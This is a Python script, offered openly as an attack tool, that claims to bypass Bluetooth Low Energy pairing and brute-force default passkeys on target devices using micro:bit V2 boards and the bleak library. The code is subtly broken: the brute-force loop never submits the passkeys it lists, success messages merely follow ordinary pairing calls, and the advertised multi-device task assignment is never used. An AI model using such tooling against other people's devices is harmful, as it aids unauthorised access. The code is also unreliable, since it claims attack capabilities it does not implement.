# microbit_ble_auth_bypass.py

"""
BLE Authentication Bypass Attack for micro:bit V2 (Multi-Device Support)

This script attempts to bypass authentication mechanisms on BLE devices by exploiting weak pairing methods.
- Detects available micro:bit devices and assigns tasks dynamically
- Attempts Just Works and Passkey authentication bypass (`--bypass <target_mac> <method>`)
- Brute-forces default passcodes (`--bruteforce <target_mac>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Attempt to bypass BLE authentication using "Just Works":
   ```sh
   python microbit_ble_auth_bypass.py --bypass AA:BB:CC:DD:EE:FF justworks
   ```

2. Brute-force BLE passkey authentication:
   ```sh
   python microbit_ble_auth_bypass.py --bruteforce AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Authentication Bypass
async def ble_auth_bypass(target_mac, method):
    """Attempts to bypass BLE authentication using known weaknesses."""
    print(f"[+] Attempting {method} authentication bypass on {target_mac}...")
    async with BleakClient(target_mac) as client:
        try:
            if method == "justworks":
                await client.pair(protection_level=1)
            elif method == "passkey":
                await client.pair(protection_level=2)
            print(f"[+] Authentication bypassed using {method} method!")
        except Exception as e:
            print(f"[-] Authentication bypass failed: {e}")

# BLE Passkey Brute-Forcing
async def ble_bruteforce(target_mac):
    """Brute-forces BLE passkey authentication by trying common passcodes."""
    print(f"[+] Starting BLE passkey brute-force attack on {target_mac}...")
    passkeys = ["000000", "123456", "654321", "999999", "111111", "000123", "112233", "123123"]
    async with BleakClient(target_mac) as client:
        for passkey in passkeys:
            try:
                await client.pair(protection_level=2)
                print(f"[+] Passkey {passkey} worked!")
                break
            except Exception as e:
                print(f"[-] Failed with passkey {passkey}: {e}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Authentication Bypass Attack for micro:bit V2")
    parser.add_argument("--bypass", nargs=2, metavar=("target_mac", "method"), help="Attempt to bypass BLE authentication")
    parser.add_argument("--bruteforce", metavar="target_mac", help="Brute-force BLE passkey authentication")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.bypass:
        loop.run_until_complete(ble_auth_bypass(args.bypass[0], args.bypass[1]))
    elif args.bruteforce:
        loop.run_until_complete(ble_bruteforce(args.bruteforce))
